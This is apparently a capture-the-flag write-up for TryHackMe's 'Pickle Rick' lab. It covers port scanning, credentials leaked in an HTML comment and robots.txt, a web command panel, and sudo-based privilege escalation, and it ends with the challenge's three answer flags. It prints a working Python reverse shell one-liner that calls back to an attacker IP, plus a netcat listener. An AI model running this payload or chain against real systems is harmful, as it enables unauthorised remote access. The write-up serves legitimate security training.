# Pickle Rick — CTF Writeup

> **A Rick and Morty themed CTF challenge. Help turn Rick back into a human by finding all 3 secret ingredients!**

---

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Step 1 — Nmap Scan](#step-1--nmap-scan)
- [Step 2 — Source Code Analysis](#step-2--source-code-analysis)
- [Step 3 — Directory Enumeration with Gobuster](#step-3--directory-enumeration-with-gobuster)
- [Step 4 — robots.txt Discovery](#step-4--robotstxt-discovery)
- [Step 5 — Login](#step-5--login)
- [Step 6 — Python Version Check](#step-6--python-version-check)
- [Step 7 — Reverse Shell Payload](#step-7--reverse-shell-payload)
- [Step 8 — Shell Access & 1st Ingredient](#step-8--shell-access--1st-ingredient)
- [Step 9 — clue.txt](#step-9--cluetxt)
- [Step 10 — 2nd Ingredient](#step-10--2nd-ingredient)
- [Step 11 — Privilege Escalation & 3rd Ingredient](#step-11--privilege-escalation--3rd-ingredient)
- [Flags Summary](#flags-summary)

---

## Challenge Overview

| Field       | Details                    |
|-------------|----------------------------|
| Name        | Pickle Rick                |
| Platform    | TryHackMe                  |
| Difficulty  | Easy                       |
| Category    | Web / Linux Privilege Escalation |
| Objective   | Find 3 secret ingredients  |

---

## Step 1 — Nmap Scan

Started with a full Nmap scan to identify open ports and running services on the target.

**Command used:**
```bash
nmap -sV -sC -p- -sS -Pn 10.49.133.233
```

**Scan Results:**

| Port     | State | Service | Version                              |
|----------|-------|---------|--------------------------------------|
| 22/tcp   | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11     |
| 80/tcp   | open  | http    | Apache httpd 2.4.41 (Ubuntu)         |

**Key Observations:**
- SSH is running on port 22 (potential access vector later)
- HTTP on port 80 — Apache server with page title **"Rick is sup4r cool"**
- OS detected: **Linux (Ubuntu)**

---

## Step 2 — Source Code Analysis

Inspecting the page source of `index.html` revealed a hidden comment with a username.



**Finding:**

```html
<!-- Note to self, remember username! -->
<!-- Username: R1ckRul3s -->
```

> The developer left credentials in an HTML comment — a classic OPSEC mistake.  
> **Username found:** `R1ckRul3s`

---

## Step 3 — Directory Enumeration with Gobuster

Used Gobuster to brute-force directories and files on the web server.

**Command used:**
```bash
gobuster dir -u http://10.49.133.233/ -w directory-list-lowercase-2.3-medium.txt -x php,html,txt,zip
```

**Discovered Paths:**

| Path          | Status Code | Size  |
|---------------|-------------|-------|
| /index.html   | 200         | 1062  |
| /login.php    | 200         | 882   |
| /assets       | 301         | 315   |
| /portal.php   | 302         | 0     |
| /robots.txt   | 200         | 17    |

> Two important targets found: `login.php` and `robots.txt`

---

## Step 4 — robots.txt Discovery

Navigated to `/robots.txt` to check for any disallowed paths or hidden clues.


**Content of robots.txt:**
```
Wubbalubbadubdub
```

> This is the **password** for the login page!  
> **Password found:** `Wubbalubbadubdub`

---

## Step 5 — Login

Using the credentials gathered:

| Field    | Value            |
|----------|------------------|
| Username | `R1ckRul3s`      |
| Password | `Wubbalubbadubdub` |

Successfully logged in at `http://10.49.133.233/login.php` and was redirected to `portal.php` — a **Command Panel** that allows executing OS commands directly.

---

## Step 6 — Python Version Check

Before attempting a reverse shell, checked which Python version was available on the server.


**Command run in the panel:**
```bash
which python3
```

**Output:**
```
/usr/bin/python3
```

> Standard `python` was not available, but **python3** was present — important for crafting the reverse shell.

---

## Step 7 — Reverse Shell Payload

Crafted a Python3 reverse shell and executed it through the Command Panel while a Netcat listener was set up on the attacker machine.



**Payload used:**
```python
python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.49.115.182",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

**Netcat listener (on attacker machine):**
```bash
nc -lvnp 1234
```

---

## Step 8 — Shell Access & 1st Ingredient

Got a reverse shell as `www-data`. Listed the web directory and found the first ingredient file.

![alt text](image-5.png)

**Commands run:**
```bash
ls
cat Sup3rS3cretPickl3Ingred.txt
```

**Output:**
```
mr. meeseek hair
```

> 🥒 **1st Ingredient:** `mr. meeseek hair`

---

## Step 9 — clue.txt

Found a `clue.txt` file in the same directory hinting at where to look next.

**Command:**
```bash
cat clue.txt
```

**Output:**
```
Look around the file system for the other ingredient.
```

> The clue points to exploring other parts of the file system — specifically home directories.

---

## Step 10 — 2nd Ingredient

Navigated to the `/home` directory and found user `rick` with the second ingredient.

**Commands run:**
```bash
ls /home
cd rick
ls
cat 'second ingredients'
```

**Output:**
```
1 jerry tear
```

> 🥒 **2nd Ingredient:** `1 jerry tear`

---

## Step 11 — Privilege Escalation & 3rd Ingredient

Checked what sudo permissions the `www-data` user had.

**Command:**
```bash
sudo -l
```

**Output:**
```
User www-data may run the following commands on ip-10-48-190-113:
    (ALL) NOPASSWD: ALL
```

> The `www-data` user can run **ALL** commands as root with **NO password** — instant privilege escalation!

**Escalation:**
```bash
sudo /bin/bash
whoami   # → root
cd /root
ls       # → 3rd.txt  snap
cat 3rd.txt
```

**Output:**
```
3rd ingredients: fleeb juice
```

> 🥒 **3rd Ingredient:** `fleeb juice`

---

## Flags Summary

| # | Ingredient         | Location                                      |
|---|--------------------|-----------------------------------------------|
| 1 | `mr. meeseek hair` | `/var/www/html/Sup3rS3cretPickl3Ingred.txt`   |
| 2 | `1 jerry tear`     | `/home/rick/second ingredients`               |
| 3 | `fleeb juice`      | `/root/3rd.txt`                               |

---

## Key Takeaways

- Always check **page source** for hardcoded credentials or comments
- **robots.txt** can leak sensitive information
- **Gobuster** is essential for discovering hidden endpoints
- Verify available scripting languages before crafting reverse shells
- Always check `sudo -l` — misconfigured sudo permissions are a common and critical vulnerability

---

*Writeup by: [showrya] | Platform: TryHackMe | Challenge: Pickle Rick*
